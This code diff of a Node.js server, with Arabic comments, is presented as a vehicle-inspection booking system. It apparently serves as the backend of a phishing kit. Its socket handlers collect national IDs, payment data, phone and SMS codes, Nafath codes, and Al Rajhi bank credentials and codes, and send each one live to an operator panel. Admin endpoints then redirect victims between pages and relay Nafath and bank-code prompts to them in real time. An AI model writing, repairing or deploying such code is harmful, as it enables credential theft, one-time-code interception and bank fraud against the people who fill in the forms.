@@ -1,6 +1,6 @@
 /**
  * server.js - الخادم الرئيسي لنظام حجز الفحص الفني
- * تم تعديله ليدعم PostgreSQL على Railway - نسخة كاملة بدون اختصار
+ * تم تعديله ليدعم PostgreSQL على Railway - نسخة كاملة مُصلحة
  */
 
 require("dotenv").config();
@@ -276,151 +276,224 @@ function notifyAdmin(event, data) {
 io.on("connection", (socket) => {
   console.log("User connected:", socket.id);
 
-  // Submit booking
-  socket.on("submitBooking", async (data, callback) => {
+  // Submit booking - يُرسل ackNewDate للعميل
+  socket.on("submitBooking", async (data) => {
     try {
       const referenceId = nanoid(10).toUpperCase();
       const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
+      
+      // تحليل بيانات اللوحة
+      const plateParts = (data.plate || "").split("-");
+      const plateChars = (plateParts[0] || "").trim().split(" ");
+      
       const booking = await createBooking({
-        ...data,
         referenceId,
-        clientIp,
+        clientName: data.name || "",
+        clientId: data.nationalID || "",
+        clientPhone: data.phoneNumber || "",
+        clientEmail: data.email || "",
+        clientNationality: data.nationality || "",
+        hasDelegate: data.delegateOn ? 1 : 0,
+        delegateType: data.commissioner?.type || "",
+        delegateName: data.commissioner?.name || "",
+        delegatePhone: data.commissioner?.phone || "",
+        delegateNationality: data.commissioner?.nationality || "",
+        delegateId: data.commissioner?.id || "",
+        vehicleCountry: data.countryOfRegistration || "",
+        vehiclePlate: data.plate || "",
+        vehiclePlateChar1: plateChars[0] || "",
+        vehiclePlateChar2: plateChars[1] || "",
+        vehiclePlateChar3: plateChars[2] || "",
+        vehicleType: data.serviceType || "",
+        vehicleCarryDang: 0,
+        serviceRegion: data.region || "",
+        serviceType: data.serviceType || "",
+        serviceDate: data.dateSvc || "",
+        serviceTime: data.timeSvc || "",
+        clientIp: data.ip || clientIp,
+        rawData: data,
         status: "new",
-        statusRead: 0,
-        rawData: data
+        statusRead: 0
       });
+      
+      // إضافة المستخدم لغرفة الـ referenceId
       socket.join(referenceId);
-      notifyAdmin("newBooking", booking);
-      if (callback) callback({ success: true, referenceId });
+      // حفظ referenceId في socket للاستخدام لاحقاً
+      socket.referenceId = referenceId;
+      
+      // إشعار الأدمن
+      notifyAdmin("newBooking", { ...booking, referenceId });
+      
+      // إرسال الرد للعميل - هذا هو ما تنتظره الواجهة الأمامية
+      socket.emit("ackNewDate", { success: true, referenceId });
+      
     } catch (err) {
       console.error("submitBooking error:", err);
-      if (callback) callback({ success: false, error: err.message });
+      socket.emit("ackNewDate", { success: false, error: err.message });
     }
   });
 
-  // Submit payment data
-  socket.on("submitPaymentData", async (data, callback) => {
+  // Submit payment data - يُرسل ackPayment للعميل
+  socket.on("submitPaymentData", async (data) => {
     try {
-      const { referenceId, ...paymentData } = data;
-      if (!referenceId) return callback && callback({ success: false, error: "No referenceId" });
-      const payment = await createOrUpdatePayment(referenceId, { ...paymentData, rawData: data });
+      const { referenceId } = data;
+      if (!referenceId) {
+        socket.emit("ackPayment", { success: false, error: "No referenceId" });
+        return;
+      }
+      await createOrUpdatePayment(referenceId, { ...data, rawData: data });
       socket.join(referenceId);
-      notifyAdmin("newPayment", { referenceId, ...paymentData });
-      if (callback) callback({ success: true });
+      notifyAdmin("newPayment", { referenceId, ...data });
+      socket.emit("ackPayment", { success: true });
     } catch (err) {
       console.error("submitPaymentData error:", err);
-      if (callback) callback({ success: false, error: err.message });
+      socket.emit("ackPayment", { success: false, error: err.message });
     }
   });
 
-  // Submit phone data
-  socket.on("submitPhoneData", async (data, callback) => {
+  // Submit phone data - يُرسل ackPhone للعميل
+  socket.on("submitPhoneData", async (data) => {
     try {
       const { referenceId } = data;
-      if (!referenceId) return callback && callback({ success: false });
+      if (!referenceId) {
+        socket.emit("ackPhone", { success: false });
+        return;
+      }
       await createOrUpdateVerification(referenceId, "phone", { ...data, rawData: data });
       notifyAdmin("newVerification", { type: "phone", referenceId, ...data });
-      if (callback) callback({ success: true });
+      socket.emit("ackPhone", { success: true });
     } catch (err) {
-      if (callback) callback({ success: false, error: err.message });
+      console.error("submitPhoneData error:", err);
+      socket.emit("ackPhone", { success: false, error: err.message });
     }
   });
 
-  // Submit phone code data
-  socket.on("submitPhoneCodeData", async (data, callback) => {
+  // Submit phone code data - يُرسل ackPhoneCode للعميل
+  socket.on("submitPhoneCodeData", async (data) => {
     try {
       const { referenceId } = data;
-      if (!referenceId) return callback && callback({ success: false });
+      if (!referenceId) {
+        socket.emit("ackPhoneCode", { success: false });
+        return;
+      }
       await createOrUpdateVerification(referenceId, "phoneCode", { ...data, rawData: data });
       notifyAdmin("newVerification", { type: "phoneCode", referenceId, ...data });
-      if (callback) callback({ success: true });
+      socket.emit("ackPhoneCode", { success: true });
     } catch (err) {
-      if (callback) callback({ success: false, error: err.message });
+      console.error("submitPhoneCodeData error:", err);
+      socket.emit("ackPhoneCode", { success: false, error: err.message });
     }
   });
 
-  // Submit nafad data
-  socket.on("submitNafadData", async (data, callback) => {
+  // Submit nafad data - يُرسل ackNafad للعميل
+  socket.on("submitNafadData", async (data) => {
     try {
       const { referenceId } = data;
-      if (!referenceId) return callback && callback({ success: false });
+      if (!referenceId) {
+        socket.emit("ackNafad", { success: false });
+        return;
+      }
       await createOrUpdateVerification(referenceId, "nafad", { ...data, rawData: data });
       notifyAdmin("newVerification", { type: "nafad", referenceId, ...data });
-      if (callback) callback({ success: true });
+      socket.emit("ackNafad", { success: true });
     } catch (err) {
-      if (callback) callback({ success: false, error: err.message });
+      console.error("submitNafadData error:", err);
+      socket.emit("ackNafad", { success: false, error: err.message });
     }
   });
 
-  // Submit code data
-  socket.on("submitCodeData", async (data, callback) => {
+  // Submit code data - يُرسل ackCode للعميل
+  socket.on("submitCodeData", async (data) => {
     try {
       const { referenceId } = data;
-      if (!referenceId) return callback && callback({ success: false });
+      if (!referenceId) {
+        socket.emit("ackCode", { success: false });
+        return;
+      }
       await createOrUpdateVerification(referenceId, "code", { otpCode: data.code, ...data, rawData: data });
       notifyAdmin("newVerification", { type: "code", referenceId, ...data });
-      if (callback) callback({ success: true });
+      socket.emit("ackCode", { success: true });
     } catch (err) {
-      if (callback) callback({ success: false, error: err.message });
+      console.error("submitCodeData error:", err);
+      socket.emit("ackCode", { success: false, error: err.message });
     }
   });
 
-  // Submit rajhi data
-  socket.on("submitRajhiData", async (data, callback) => {
+  // Submit rajhi data - يُرسل ackRajhi للعميل
+  socket.on("submitRajhiData", async (data) => {
     try {
       const { referenceId } = data;
-      if (!referenceId) return callback && callback({ success: false });
+      if (!referenceId) {
+        socket.emit("ackRajhi", { success: false });
+        return;
+      }
       await createOrUpdateVerification(referenceId, "rajhi", { ...data, rawData: data });
       notifyAdmin("newVerification", { type: "rajhi", referenceId, ...data });
-      if (callback) callback({ success: true });
+      socket.emit("ackRajhi", { success: true });
     } catch (err) {
-      if (callback) callback({ success: false, error: err.message });
+      console.error("submitRajhiData error:", err);
+      socket.emit("ackRajhi", { success: false, error: err.message });
     }
   });
 
-  // Submit rajhi code data
-  socket.on("submitRajhiCodeData", async (data, callback) => {
+  // Submit rajhi code data - يُرسل ackRajhiCode للعميل (بعد إدخال كود الراجحي)
+  socket.on("submitRajhiCodeData", async (data) => {
     try {
       const { referenceId } = data;
-      if (!referenceId) return callback && callback({ success: false });
+      if (!referenceId) {
+        socket.emit("ackRajhiCode", { success: false });
+        return;
+      }
       await createOrUpdateVerification(referenceId, "rajhiCode", { ...data, rawData: data });
       notifyAdmin("newVerification", { type: "rajhiCode", referenceId, ...data });
-      if (callback) callback({ success: true });
+      socket.emit("ackRajhiCode", { success: true });
     } catch (err) {
-      if (callback) callback({ success: false, error: err.message });
+      console.error("submitRajhiCodeData error:", err);
+      socket.emit("ackRajhiCode", { success: false, error: err.message });
     }
   });
 
-  // Submit verification data
-  socket.on("submitVerificationData", async (data, callback) => {
+  // Submit verification data - يُرسل ackVerification للعميل
+  socket.on("submitVerificationData", async (data) => {
     try {
       const { referenceId, type } = data;
-      if (!referenceId) return callback && callback({ success: false });
+      if (!referenceId) {
+        socket.emit("ackVerification", { success: false });
+        return;
+      }
       await createOrUpdateVerification(referenceId, type || "verification", { ...data, rawData: data });
       notifyAdmin("newVerification", { referenceId, ...data });
-      if (callback) callback({ success: true });
+      socket.emit("ackVerification", { success: true });
     } catch (err) {
-      if (callback) callback({ success: false, error: err.message });
+      console.error("submitVerificationData error:", err);
+      socket.emit("ackVerification", { success: false, error: err.message });
     }
   });
 
   // Update location
-  socket.on("updateLocation", async (data, callback) => {
+  socket.on("updateLocation", async (data) => {
     try {
       notifyAdmin("locationUpdate", { socketId: socket.id, ...data });
-      if (callback) callback({ success: true });
     } catch (err) {
-      if (callback) callback({ success: false });
+      console.error("updateLocation error:", err);
     }
   });
 
   // Get nafad code
-  socket.on("getNafadCode", async (data, callback) => {
+  socket.on("getNafadCode", async (data) => {
     try {
       notifyAdmin("nafadCodeRequest", { socketId: socket.id, ...data });
-      if (callback) callback({ success: true });
     } catch (err) {
-      if (callback) callback({ success: false });
+      console.error("getNafadCode error:", err);
+    }
+  });
+
+  // stcCallReceived
+  socket.on("stcCallReceived", async (data) => {
+    try {
+      notifyAdmin("stcCallReceived", { socketId: socket.id, ...data });
+    } catch (err) {
+      console.error("stcCallReceived error:", err);
     }
   });
 
@@ -476,6 +549,19 @@ app.get("/api/admin/bookings", verifyAdminToken, async (req, res) => {
   }
 });
 
+// Get single booking
+app.get("/api/admin/bookings/:referenceId", verifyAdminToken, async (req, res) => {
+  try {
+    const booking = await getBookingByReference(req.params.referenceId);
+    if (!booking) return res.status(404).json({ error: "Not found" });
+    const payment = await getPaymentByReference(req.params.referenceId);
+    const verification = await getVerificationByReference(req.params.referenceId, "nafad");
+    res.json({ success: true, data: { booking, payment, verification } });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // Get stats
 app.get("/api/admin/stats", verifyAdminToken, async (req, res) => {
   try {
@@ -494,8 +580,9 @@ app.get("/api/admin/stats", verifyAdminToken, async (req, res) => {
 // Update booking status
 app.post("/api/admin/update-status", verifyAdminToken, async (req, res) => {
   try {
-    const { referenceId, status, statusRead } = req.body;
-    await updateBookingStatus(referenceId, status, statusRead);
+    const { referenceId, reference, status, statusRead } = req.body;
+    const ref = referenceId || reference;
+    await updateBookingStatus(ref, status, statusRead);
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -505,9 +592,10 @@ app.post("/api/admin/update-status", verifyAdminToken, async (req, res) => {
 // Navigate user to page
 app.post("/api/admin/navigate", verifyAdminToken, async (req, res) => {
   try {
-    const { referenceId, page } = req.body;
+    const { referenceId, reference, page, clientIp } = req.body;
+    const ref = referenceId || reference;
     // Emit to specific user room
-    io.to(referenceId).emit("navigateTo", { page });
+    io.to(ref).emit("navigateTo", { page, ip: clientIp });
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -517,8 +605,9 @@ app.post("/api/admin/navigate", verifyAdminToken, async (req, res) => {
 // Send nafath code to user
 app.post("/api/admin/send-nafath-code", verifyAdminToken, async (req, res) => {
   try {
-    const { referenceId, code } = req.body;
-    io.to(referenceId).emit("nafadCode", { code });
+    const { referenceId, reference, code } = req.body;
+    const ref = referenceId || reference;
+    io.to(ref).emit("nafadCode", { code });
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -528,8 +617,9 @@ app.post("/api/admin/send-nafath-code", verifyAdminToken, async (req, res) => {
 // Nafath action
 app.post("/api/admin/nafath-action", verifyAdminToken, async (req, res) => {
   try {
-    const { referenceId, action, data } = req.body;
-    io.to(referenceId).emit("nafadCode", { action, ...data });
+    const { referenceId, reference, action, data } = req.body;
+    const ref = referenceId || reference;
+    io.to(ref).emit("nafadCode", { action, ...(data || {}) });
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -539,8 +629,9 @@ app.post("/api/admin/nafath-action", verifyAdminToken, async (req, res) => {
 // Payment action
 app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
   try {
-    const { referenceId, action, data } = req.body;
-    io.to(referenceId).emit("ackRajhiCode", { action, ...data });
+    const { referenceId, reference, action, data } = req.body;
+    const ref = referenceId || reference;
+    io.to(ref).emit("ackRajhiCode", { action, ...(data || {}) });
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
